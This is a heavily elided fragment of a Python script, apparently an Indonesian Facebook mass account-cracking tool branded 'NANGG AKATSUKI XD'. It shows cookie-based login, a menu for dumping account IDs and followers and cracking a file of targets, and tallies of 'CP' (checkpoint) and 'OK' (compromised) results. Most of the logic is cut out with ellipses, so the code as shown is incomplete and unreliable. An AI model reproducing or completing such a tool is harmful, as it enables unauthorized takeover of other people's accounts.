...
╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚═════╝░
			...
			{m}█{k}█{h}█{sir} NANGG AKATSUKI XD {x}{m}█{k}█{h}█{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				print("\x1b[1;92m[×\x1b[1;92m]\033[93m └──\x1b[1;92mcookies telah mokad")
...
def menu(id):
	...
	cetak(nel('ᴡɪʟᴜᴊᴇᴜɴɢ ꜱᴜᴍᴘɪɴɢ '))
	print(f'>> 𝕀𝔻 : {id}')
	print(f'>> 𝕀ℙ  : {ip}')
	print('')
	print('>> 1. ɴɢᴀʙᴀɴɢꜱᴀᴛ ʙᴀʙᴀᴛᴜʀᴀɴ ')
	print('>> 2. ɴɢᴀʙᴀɴɢꜱᴀᴛ ɴᴜɴᴛᴜʀᴋᴇɴ ')
	print('>> 3. ɴɢᴀʙᴀɴɢꜱᴀᴛ ᴋᴀʙᴇʜᴀɴ   ')
	print('>> 4. ɴɢᴀʙᴀɴɢꜱᴀᴛ ᴅᴀᴛᴀ ɴᴇɢᴀʀᴀ	')
	print('>> 5. ʜᴀꜱɪʟ ɴɢᴀʙᴀɴɢꜱᴀᴛ  ')
	print('>> 0. ᴍᴇʀᴀᴅ ɪɴᴅɪᴛ       ')
	_____nangg__akatsuki_____ = input('\n>> Pilih : ')
	if _____nangg__akatsuki_____ in ['1']:
		dump_massal()
	elif _____nangg__akatsuki_____ in ['2']:
		dump_follower()
	elif _____nangg__akatsuki_____ in ['3']:
		error()
	elif _____nangg__akatsuki_____ in ['4']:
		crack_file()
	elif _____nangg__akatsuki_____ in ['5']:
		result()
	elif _____nangg__akatsuki_____ in ['0']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='NANGG-XD CP'))
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]NANGG-XD OK[/bold green]'))
					ok+=1
					break
